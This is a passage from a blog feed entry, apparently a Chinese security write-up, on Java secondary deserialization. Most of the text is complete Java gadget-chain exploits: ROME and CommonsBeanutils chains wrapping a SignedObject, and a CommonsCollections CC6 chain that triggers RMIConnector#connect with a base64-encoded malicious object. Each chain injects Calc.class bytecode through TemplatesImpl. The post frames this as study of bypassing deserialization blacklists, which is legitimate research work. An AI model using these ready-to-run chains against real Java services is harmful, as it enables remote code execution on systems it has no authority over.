class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> SignedObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Utils.ReflectUtils;</span><br><span class="line"><span class="keyword">import</span> Utils.SerialUtils;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPair;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPairGenerator;</span><br><span class="line"><span class="keyword">import</span> java.security.Signature;</span><br><span class="line"><span class="keyword">import</span> java.security.SignedObject;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ROMEBadAttributeValueExpException</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; evilObject = (HashMap&lt;Object, Object&gt;) getEvilObject();</span><br><span class="line">        <span class="type">KeyPairGenerator</span> <span class="variable">kpg</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        kpg.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">kp</span> <span class="operator">=</span> kpg.generateKeyPair();</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(evilObject, kp.getPrivate(), Signature.getInstance(<span class="string">&quot;DSA&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(SignedObject.class,signedObject);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line">        ReflectUtils.setFieldValue(badAttributeValueExpException,<span class="string">&quot;val&quot;</span>,toStringBean);</span><br><span class="line"></span><br><span class="line">        SerialUtils.serialize(badAttributeValueExpException);</span><br><span class="line">        SerialUtils.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// here can be CC object or others need to deserialize.</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getEvilObject</span><span class="params">()</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Calc.class&quot;</span>));</span><br><span class="line">        ReflectUtils.setFieldValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Jasper&quot;</span>);</span><br><span class="line">        ReflectUtils.setFieldValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templatesimpl);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(equalsBean, <span class="string">&quot;123&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> hashMap;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>这个ROME链，需要SpringBoot依赖。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> SignedObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Utils.ReflectUtils;</span><br><span class="line"><span class="keyword">import</span> Utils.SerialUtils;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPair;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPairGenerator;</span><br><span class="line"><span class="keyword">import</span> java.security.Signature;</span><br><span class="line"><span class="keyword">import</span> java.security.SignedObject;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ROMEHotSwappableTargetSource</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; evilObject = (HashMap&lt;Object, Object&gt;) getEvilObject();</span><br><span class="line"></span><br><span class="line">        <span class="type">KeyPairGenerator</span> <span class="variable">kpg</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        kpg.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">kp</span> <span class="operator">=</span> kpg.generateKeyPair();</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(evilObject, kp.getPrivate(), Signature.getInstance(<span class="string">&quot;DSA&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(SignedObject.class,signedObject);</span><br><span class="line"></span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">h1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(toStringBean);</span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">h2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(<span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;jasper&quot;</span>));</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(h1,h1);</span><br><span class="line">        hashMap.put(h2,h2);</span><br><span class="line"></span><br><span class="line">        SerialUtils.serialize(hashMap);</span><br><span class="line">        SerialUtils.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// here can be CC object or others need to deserialize.</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getEvilObject</span><span class="params">()</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Calc.class&quot;</span>));</span><br><span class="line">        ReflectUtils.setFieldValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Jasper&quot;</span>);</span><br><span class="line">        ReflectUtils.setFieldValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templatesimpl);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(equalsBean, <span class="string">&quot;123&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> hashMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>下面需要有CB依赖（1.9.4），本质是利用CB链调用任意getter，进而调用SignedObject#getObject<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> SignedObject;</span><br><span class="line"><span class="keyword">import</span> Utils.ReflectUtils;</span><br><span class="line"><span class="keyword">import</span> Utils.SerialUtils;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPair;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPairGenerator;</span><br><span class="line"><span class="keyword">import</span> java.security.Signature;</span><br><span class="line"><span class="keyword">import</span> java.security.SignedObject;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CB1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        HashMap&lt;Object,Object&gt; evilObject = (HashMap&lt;Object, Object&gt;) getEvilObject();</span><br><span class="line"></span><br><span class="line">        <span class="type">KeyPairGenerator</span> <span class="variable">kpg</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        kpg.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">kp</span> <span class="operator">=</span> kpg.generateKeyPair();</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(evilObject, kp.getPrivate(), Signature.getInstance(<span class="string">&quot;DSA&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//add会提前触发链条，这里选择先提前add，再统一传参</span></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(beanComparator);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//统一传参，防止链条被破坏</span></span><br><span class="line">        ReflectUtils.setFieldValue(priorityQueue,<span class="string">&quot;queue&quot;</span>,<span class="keyword">new</span> <span class="title class_">SignedObject</span>[]&#123;signedObject,signedObject&#125;);</span><br><span class="line">        ReflectUtils.setFieldValue(beanComparator,<span class="string">&quot;property&quot;</span>,<span class="string">&quot;object&quot;</span>);</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        SerialUtils.serialize(priorityQueue);</span><br><span class="line">        SerialUtils.unserialize();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// here can be CC object or others need to deserialize.</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getEvilObject</span><span class="params">()</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Calc.class&quot;</span>));</span><br><span class="line">        ReflectUtils.setFieldValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Jasper&quot;</span>);</span><br><span class="line">        ReflectUtils.setFieldValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templatesimpl);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(equalsBean, <span class="string">&quot;123&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> hashMap;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="CC链触发RMIConnector"><a href="#CC链触发RMIConnector" class="headerlink" title="CC链触发RMIConnector"></a>CC链触发RMIConnector</h2><p>利用CC链命令执行的功能，去执行RMIConnector#connect方法，下面以CC6为例。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> RMIConnector;</span><br><span class="line"><span class="keyword">import</span> Utils.*;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.remote.JMXServiceURL;</span><br><span class="line"><span class="keyword">import</span> javax.management.remote.rmi.RMIConnector;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> Utils.ReflectUtils.setFieldValue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// get b64string of evil object</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; evilObject = (HashMap&lt;Object, Object&gt;) getEvilObject();</span><br><span class="line">        <span class="type">String</span> <span class="variable">evilB64</span> <span class="operator">=</span> SerialUtils.serializeB64(evilObject);</span><br><span class="line">        <span class="comment">// put evil object into rmiConnector</span></span><br><span class="line">        <span class="type">JMXServiceURL</span> <span class="variable">jmxServiceURL</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMXServiceURL</span>(<span class="string">&quot;service:jmx:rmi://&quot;</span>);</span><br><span class="line">        setFieldValue(jmxServiceURL, <span class="string">&quot;urlPath&quot;</span>, <span class="string">&quot;/stub/&quot;</span>+evilB64);</span><br><span class="line">        <span class="type">RMIConnector</span> <span class="variable">rmiConnector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIConnector</span>(jmxServiceURL, <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">// trigger rmiConnector#connect</span></span><br><span class="line">        Transformer[] transformers =  <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(rmiConnector),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;connect&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;key1&quot;</span>,<span class="string">&quot;value1&quot;</span>);</span><br><span class="line">        <span class="comment">//断开链子，防止put消耗链条</span></span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(hashMap,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;key2&quot;</span>);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap1.put(tiedMapEntry,<span class="string">&quot;Jasper&quot;</span>);</span><br><span class="line">        <span class="comment">//把链子改回来</span></span><br><span class="line">        setFieldValue(lazyMap,<span class="string">&quot;factory&quot;</span>,chainedTransformer);</span><br><span class="line">        <span class="comment">//绕过懒加载，调用Transform</span></span><br><span class="line">        lazyMap.remove(<span class="string">&quot;key2&quot;</span>);</span><br><span class="line"><span class="comment">//        SerialUtils.serialize(hashMap1);</span></span><br><span class="line">        SerialUtils.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// here can be CC object or others need to deserialize.</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getEvilObject</span><span class="params">()</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Calc.class&quot;</span>));</span><br><span class="line">        ReflectUtils.setFieldValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Jasper&quot;</span>);</span><br><span class="line">        ReflectUtils.setFieldValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templatesimpl);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(equalsBean, <span class="string">&quot;123&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> hashMap;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>二次反序列化，本质就是利用其他类，给我们要反序列化的对象套一层壳子。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="http://www.bmth666.cn/2022/09/20/java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2/">Java二次反序列化初探@Bmth</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;题目hook resolveClass存在入口类黑名单，就可以用二次反序列化绕过，例如巅峰极客的babyurl。&lt;br&gt;本质是，A类的a方法</summary>
      
    
    
    
    
    <category term="Java" scheme="https://jaspersec.top/tags/Java/"/>
    
    <category term="二次反序列化" scheme="https://jaspersec.top/tags/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Java反序列化 ROME链</title>
    <link href="https://jaspersec.top/posts/4145469421.html"/>
    <id>https://jaspersec.top/posts/4145469421.html</id>
    <published>2023-12-24T05:32:20.000Z</published>
    <updated>2025-03-31T22:09:47.233Z</updated>
    
